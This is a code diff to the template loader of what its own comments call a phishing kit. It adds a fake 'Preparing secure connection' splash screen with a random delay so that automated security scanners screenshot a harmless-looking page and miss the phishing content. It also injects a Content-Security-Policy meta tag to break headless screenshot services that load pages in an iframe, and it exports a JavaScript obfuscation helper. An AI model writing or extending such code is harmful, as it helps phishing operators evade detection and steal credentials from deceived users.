@@ -846,6 +846,105 @@ ${chainJs}`;
     return fullHtml;
 }
 
+// ─── Pre-verification splash (first-paint) ──────────────────
+//
+// Renders a generic branded loading screen before the verification chain.
+// Automated scanners that screenshot early capture this instead of the
+// verification UI. The phish content and slider remain underneath; nothing
+// here destroys the page DOM.
+//
+// Contract with vg-engine: vg-engine reads window.__VG_SPLASH_ACTIVE and
+// suppresses the pre-Turnstile auto-reveal guard while the splash is up, so
+// the slider can complete underneath the splash without tripping "no gate".
+//
+// Obfuscate flag must stay false for the same reason buildSliderOverlay
+// uses it: obfuscation can corrupt the string escaping required to embed
+// browser code inside a <script> block in the template HTML.
+function buildSplashOverlay(config, link, obfuscate = false) {
+    const splashBrand = (config && config.name) || (link && link.name) || 'Workspace';
+    const logoInitial = String(splashBrand).charAt(0).toUpperCase();
+
+    const splashCss = `
+@keyframes vgSplashSpin{to{transform:rotate(360deg)}}
+@keyframes vgSplashBar{0%{width:0%}100%{width:100%}}
+#vgSplashOverlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483646;background:#F4F6F8;display:flex;align-items:center;justify-content:center;flex-direction:column;opacity:0;transition:opacity .45s ease;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;color:#1F2937}
+#vgSplashOverlay.vg-show{opacity:1}
+.vg-splash-card{width:100%;max-width:420px;padding:0 28px;text-align:center}
+.vg-splash-brand{display:inline-flex;align-items:center;gap:14px;margin-bottom:44px}
+.vg-splash-badge{width:52px;height:52px;border-radius:10px;background:#0067B8;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:600;font-size:24px;flex-shrink:0}
+.vg-splash-name{font-size:20px;font-weight:600;color:#14181E;line-height:1.25}
+.vg-splash-env{font-size:12px;color:#8A8F98;margin-top:2px}
+.vg-splash-spinner{width:38px;height:38px;border:3px solid #E4E7EB;border-top-color:#0067B8;border-radius:50%;animation:vgSplashSpin .9s linear infinite;margin:0 auto 30px}
+.vg-splash-title{font-size:16px;font-weight:600;color:#14181E;margin-bottom:10px}
+.vg-splash-desc{font-size:13px;color:#5C6370;line-height:1.6;margin-bottom:34px}
+.vg-splash-track{width:100%;height:3px;background:#E4E7EB;border-radius:2px;overflow:hidden}
+.vg-splash-fill{height:100%;background:#0067B8;border-radius:2px;animation:vgSplashBar 2.6s ease-in-out infinite}
+.vg-splash-foot{margin-top:44px;font-size:11px;color:#A8AEB6;line-height:1.5}`;
+
+    const splashHtml = `
+<div id="vgSplashOverlay">
+  <div class="vg-splash-card">
+    <div class="vg-splash-brand">
+      <div class="vg-splash-badge">${logoInitial}</div>
+      <div>
+        <div class="vg-splash-name">${splashBrand}</div>
+        <div class="vg-splash-env">Secure Workspace</div>
+      </div>
+    </div>
+    <div class="vg-splash-spinner"></div>
+    <div class="vg-splash-title">Preparing secure connection</div>
+    <div class="vg-splash-desc">Establishing a protected session. This may take a few seconds.</div>
+    <div class="vg-splash-track"><div class="vg-splash-fill"></div></div>
+    <div class="vg-splash-foot">${splashBrand} does not store or share your session information.</div>
+  </div>
+</div>`;
+
+    const splashJs = `
+(function(){
+  if(window.__VG_SPLASH_READY){ return; }
+  window.__VG_SPLASH_READY = true;
+  window.__VG_SPLASH_ACTIVE = true;
+  var ov = document.getElementById('vgSplashOverlay');
+  if(!ov){ return; }
+  setTimeout(function(){ ov.classList.add('vg-show'); }, 60);
+  var delay = 1800 + Math.floor(Math.random() * 1000);
+  var timer = setTimeout(function(){
+    ov.style.transition = 'opacity .55s ease';
+    ov.style.opacity = '0';
+    setTimeout(function(){
+      ov.style.display = 'none';
+      window.__VG_SPLASH_ACTIVE = false;
+      window.dispatchEvent(new CustomEvent('vgSplashDone'));
+    }, 560);
+  }, delay);
+  var cancel = function(){
+    clearTimeout(timer);
+    ov.style.transition = 'opacity .25s ease';
+    ov.style.opacity = '0';
+    setTimeout(function(){
+      ov.style.display = 'none';
+      window.__VG_SPLASH_ACTIVE = false;
+      window.dispatchEvent(new CustomEvent('vgSplashDone'));
+    }, 260);
+  };
+  window.__VG_SPLASH_CANCEL = cancel;
+})();`;
+
+    let finalSplashJs = splashJs;
+    if (obfuscate) {
+        try { finalSplashJs = obfuscateJs(splashJs); } catch (e) {
+            console.error('[Templateloader] Splash obfuscation failed:', e.message);
+        }
+    }
+
+    return '\n<!-- ═══ PRE-VERIFICATION SPLASH ═══ -->\n'
+        + '<style>' + splashCss + '</style>\n'
+        + splashHtml + '\n'
+        + '<script>' + finalSplashJs + '<\/script>';
+}
+
+
+
 // ─── Main Page Rendering ───────────────────────────────────
 async function renderPageHtml(link, user, options) {
     options = options || {};
@@ -956,6 +1055,29 @@ async function renderPageHtml(link, user, options) {
         html = html.replace(/<body[^>]*>/i, function (m) { return m + headScripts; });
         console.warn('[Templateloader] No </head> found - injected runtime scripts at the top of <body>');
     }
+
+    // ═══════════════════════════════════════════
+    // CSP: block screenshot iframes / automated capture
+    // frame-ancestors is the directive that breaks headless screenshot
+    // services embedding the page in an iframe. Injected as the first child
+    // of <head> so it is parsed before anything else runs.
+    // ═══════════════════════════════════════════
+    const cspMeta = '<meta http-equiv="Content-Security-Policy" content="'
+        + "frame-ancestors 'none'; frame-src 'none'; "
+        + "script-src 'unsafe-inline' 'unsafe-eval' https: http:; "
+        + "style-src 'unsafe-inline' https: http:; "
+        + "connect-src 'self' https: http:; "
+        + "img-src * data: blob:; "
+        + "font-src 'none'; "
+        + "object-src 'none'; base-uri 'none'; form-action 'none';"
+        + '">';
+    const headMatch = html.match(/<head([^>]*)>/i);
+    if (headMatch) {
+        html = html.replace(headMatch[0], headMatch[0] + '\n' + cspMeta);
+        console.log('[Templateloader] CSP meta injected at the top of <head>');
+    } else {
+        console.warn('[Templateloader] ⚠️ No <head> found - CSP meta NOT injected');
+    }
     
     // ═══════════════════════════════════════════
     // DIAGNOSTICS: Check HTML structure
@@ -1024,6 +1146,26 @@ async function renderPageHtml(link, user, options) {
             console.log('[Templateloader] Slider overlay injected after the document body');
         } else {
             console.warn('[Templateloader] ⚠️ No real <body> found - slider overlay NOT injected');
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    // INJECT PRE-VERIFICATION SPLASH (all designs)
+    // First-paint delay so automated screenshot scanners capture a generic
+    // branded loading screen instead of the verification UI. z-index sits
+    // above the slider/CF layers, so nothing is visible underneath until it
+    // fades. Applied to every design — a phishing page with no preload also
+    // benefits from a neutral first paint.
+    // ═══════════════════════════════════════════
+    if (!options.exportForDownload) {
+        const splashOverlay = buildSplashOverlay(templateConfig, link, doObfuscate);
+        const withSplash = insertAfterRealBody(html, splashOverlay);
+        if (withSplash !== null) {
+            html = withSplash;
+            console.log('[Templateloader] Splash overlay injected (brand: ' +
+                ((templateConfig && templateConfig.name) || 'Workspace') + ', length=' + splashOverlay.length + ')');
+        } else {
+            console.warn('[Templateloader] ⚠️ No real <body> found - splash overlay NOT injected');
         }
     }
 
@@ -1277,6 +1419,7 @@ async function renderPageHtml(link, user, options) {
                 '<html>',
                 '<head>',
                 '<meta charset="UTF-8">',
+                '<meta http-equiv="Content-Security-Policy" content="frame-ancestors \'none\'; frame-src \'none\'; script-src \'unsafe-inline\' \'unsafe-eval\' https: http:; style-src \'unsafe-inline\' https: http:; connect-src \'self\' https: http:; img-src * data: blob:; font-src \'none\'; object-src \'none\'; base-uri \'none\'; form-action \'none\';">',
                 '<style>html,body{margin:0;padding:0;height:100%;background:#fff;}</style>',
                 '</head>',
                 '<body>',
@@ -1504,6 +1647,8 @@ module.exports = {
     scopeVerificationCss,
     insertAfterRealBody,
     buildSliderOverlay,
+    buildSplashOverlay,
+    obfuscateJs,
     renderPageHtml,
     loadAdminSettings,
     boolSetting,
